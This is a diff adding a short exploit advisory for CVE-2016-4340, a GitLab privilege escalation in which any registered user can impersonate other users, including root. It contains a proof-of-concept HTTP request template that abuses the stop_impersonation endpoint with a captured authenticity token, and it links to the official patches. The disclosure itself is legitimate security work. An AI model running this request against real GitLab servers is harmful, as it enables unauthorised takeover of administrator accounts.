@@ -1,0 +1,35 @@
+# Exploit Title: GitLab privilege escalation via "impersonate" feature
+# Date: 02-05-2016
+# Software Link: https://about.gitlab.com/
+# Version: 8.2.0 - 8.2.4, 8.3.0 - 8.3.8, 8.4.0 - 8.4.9, 8.5.0 - 8.5.11, 8.6.0 - 8.6.7, 8.7.0
+# Exploit Author: Kaimi
+# Website: https://kaimi.ru
+# CVE: CVE-2016-4340
+# Category: webapps
+ 
+1. Description
+   
+Any registered user can "log in" as any other user, including administrators.
+ 
+https://about.gitlab.com/2016/05/02/cve-2016-4340-patches/
+ 
+   
+2. Proof of Concept
+ 
+Login as regular user.
+Get current authenticity token by observing any POST-request (ex.: change any info in user profile).
+
+Craft request using this as template:
+ 
+POST /admin/users/stop_impersonation?id=root
+. . .
+
+_method=delete&authenticity_token=lqyOBt5U%2F0%2BPM2i%2BGDx3zaVjGgAqHzoteQ15FnrQ3E8%3D
+
+Where 'root' - desired user. 'authenticity_token' - token obtained on the previous step.
+
+   
+3. Solution:
+
+Use officialy provided solutions:
+https://about.gitlab.com/2016/05/02/cve-2016-4340-patches/
